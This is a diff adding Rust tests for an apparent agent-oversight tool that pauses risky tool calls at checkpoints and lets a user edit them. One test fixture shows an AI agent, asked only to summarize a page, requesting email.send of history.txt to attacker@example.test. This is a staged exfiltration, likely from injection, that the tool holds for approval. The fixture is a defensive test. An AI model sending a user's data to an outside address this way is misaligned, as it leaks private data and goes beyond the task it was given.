@@ -1673,3 +1673,212 @@ mod checkpoint_tests {
         );
     }
 }
+
+#[cfg(test)]
+mod edit_tests {
+    use super::*;
+    use corral_core::corral_view::{AgentCard, DropView};
+    use corral_core::domain::{ActionClass, Risk};
+    use corral_core::event::*;
+    use corral_core::ids::{CheckpointId, RunId, SessionId, SpanId, ToolCallId};
+    use corral_core::run_card::{EDIT_MAX_FIELDS, RunCards};
+    use corral_policy::Approval;
+    use serde_json::{Value, json};
+    use std::collections::BTreeMap;
+
+    const ROSTER: &str =
+        include_str!("../../../../native/CorralNative/Fixtures/bridge/roster-edit-v1.json");
+    const EDIT: &str = include_str!(
+        "../../../../native/CorralNative/Fixtures/bridge/intent-edit-checkpoint-v1.json"
+    );
+
+    fn ev(ts: u64, body: EventBody) -> Event {
+        Event {
+            run_id: RunId::from("r1"),
+            seq: 1,
+            ts,
+            span_id: SpanId::from("span"),
+            parent_span_id: None,
+            body,
+        }
+    }
+
+    fn edit(changes: Value, how: &str) -> Vec<u8> {
+        json!({"v": 1, "intent": {
+            "kind": "editCheckpoint", "id": "scout", "checkpoint": "cp-1",
+            "changes": changes, "how": how,
+        }})
+        .to_string()
+        .into_bytes()
+    }
+
+    #[test]
+    fn tp_chk_15_a_waiting_calls_fields_ride_on_the_card_as_the_fixture_shows() {
+        let mut cards = RunCards::default();
+        let args = json!({
+            "attachments": ["history.txt"],
+            "body": "the history",
+            "retries": 3,
+            "to": "attacker@example.test",
+        });
+        let events = [
+            ev(
+                0,
+                EventBody::RunQueued(RunQueued {
+                    agent_id: AgentId::from("scout"),
+                    session_id: SessionId::from("s1"),
+                    prompt: "Summarize the attached page.".into(),
+                }),
+            ),
+            ev(
+                1_000,
+                EventBody::RunStarted(RunStarted {
+                    adapter: "fake".into(),
+                }),
+            ),
+            ev(
+                1_500,
+                EventBody::ToolRequested(ToolRequested {
+                    tool_call_id: ToolCallId::from("call-1"),
+                    tool: "email.send".into(),
+                    action_class: ActionClass::CommsSend,
+                    args: args.clone(),
+                }),
+            ),
+            ev(
+                2_000,
+                EventBody::CheckpointOpened(CheckpointOpened {
+                    checkpoint_id: CheckpointId::from("cp-1"),
+                    tool_call_id: ToolCallId::from("call-1"),
+                    action_class: ActionClass::CommsSend,
+                    risk: Risk::High,
+                    title: "Sending a message or email".into(),
+                    detail: format!("email.send to attacker@example.test\n{args}"),
+                }),
+            ),
+        ];
+        for e in &events {
+            cards.observe(e).expect("legal");
+        }
+        let view = CorralView {
+            drops: vec![DropView {
+                agent: AgentCard {
+                    id: AgentId::from("scout"),
+                    name: "Scout".into(),
+                    monogram: "Sc".into(),
+                },
+                state: DropState::NeedsYou,
+            }],
+            hidden: 0,
+        };
+        let sent = RosterSnapshot::with_cards(&view, &cards, 5_000)
+            .to_bytes()
+            .expect("encode");
+        let sent: Value = serde_json::from_slice(&sent).expect("json");
+        let want: Value = serde_json::from_str(ROSTER).expect("fixture");
+        assert_eq!(sent, want);
+    }
+
+    #[test]
+    fn tp_chk_15_an_edit_from_a_card_arrives_typed() {
+        let changes: BTreeMap<String, String> = [("retries", "1"), ("to", "me@example.test")]
+            .into_iter()
+            .map(|(k, v)| (k.to_owned(), v.to_owned()))
+            .collect();
+        assert_eq!(
+            decode_intent(EDIT.as_bytes()).expect("edit"),
+            Intent::EditCheckpoint {
+                agent: AgentId::from("scout"),
+                checkpoint: CheckpointId::from("cp-1"),
+                changes: changes.clone(),
+                how: Approval::Click,
+            }
+        );
+        assert_eq!(
+            decode_intent(&edit(
+                json!({"retries": "1", "to": "me@example.test"}),
+                "keyboard"
+            ))
+            .expect("edit"),
+            Intent::EditCheckpoint {
+                agent: AgentId::from("scout"),
+                checkpoint: CheckpointId::from("cp-1"),
+                changes,
+                how: Approval::Keyboard,
+            }
+        );
+    }
+
+    #[test]
+    fn tp_chk_15_a_card_never_edits_with_touch_id_or_voice() {
+        for how in ["touchId", "voice", "Click"] {
+            assert!(
+                matches!(
+                    decode_intent(&edit(json!({"to": "me@example.test"}), how)),
+                    Err(BridgeError::Malformed(_))
+                ),
+                "{how}"
+            );
+        }
+    }
+
+    #[test]
+    fn tp_chk_15_edits_are_bounded() {
+        let many: serde_json::Map<String, Value> = (0..=EDIT_MAX_FIELDS)
+            .map(|i| (format!("k{i:02}"), json!("v")))
+            .collect();
+        assert!(matches!(
+            decode_intent(&edit(Value::Object(many), "click")),
+            Err(BridgeError::BadEdit)
+        ));
+        let fits: serde_json::Map<String, Value> = (0..EDIT_MAX_FIELDS)
+            .map(|i| (format!("k{i:02}"), json!("v")))
+            .collect();
+        assert!(decode_intent(&edit(Value::Object(fits), "click")).is_ok());
+        assert!(matches!(
+            decode_intent(&edit(json!({}), "click")),
+            Err(BridgeError::BadEdit)
+        ));
+        // A key no field can have: over 40 characters of 4 bytes each.
+        let long = "k".repeat(161);
+        assert!(matches!(
+            decode_intent(&edit(json!({ long: "v" }), "click")),
+            Err(BridgeError::BadEdit)
+        ));
+        let at_cap = "k".repeat(160);
+        assert!(decode_intent(&edit(json!({ at_cap: "v" }), "click")).is_ok());
+        // Values are text, never JSON: the core decides what they become.
+        assert!(matches!(
+            decode_intent(&edit(json!({"retries": 1}), "click")),
+            Err(BridgeError::Malformed(_))
+        ));
+        assert!(matches!(
+            decode_intent(&edit(json!(["to"]), "click")),
+            Err(BridgeError::Malformed(_))
+        ));
+        assert_eq!(
+            BridgeError::BadEdit.to_string(),
+            "an edit must change 1 to 20 fields, each with a key of at most 160 bytes"
+        );
+    }
+
+    #[test]
+    fn tp_chk_15_an_edit_needs_valid_ids() {
+        let bad = json!({"v": 1, "intent": {
+            "kind": "editCheckpoint", "id": "", "checkpoint": "cp-1",
+            "changes": {"to": "me@example.test"}, "how": "click",
+        }});
+        assert!(matches!(
+            decode_intent(bad.to_string().as_bytes()),
+            Err(BridgeError::BadId)
+        ));
+        let bad = json!({"v": 1, "intent": {
+            "kind": "editCheckpoint", "id": "scout", "checkpoint": "cp\n1",
+            "changes": {"to": "me@example.test"}, "how": "click",
+        }});
+        assert!(matches!(
+            decode_intent(bad.to_string().as_bytes()),
+            Err(BridgeError::BadId)
+        ));
+    }
+}
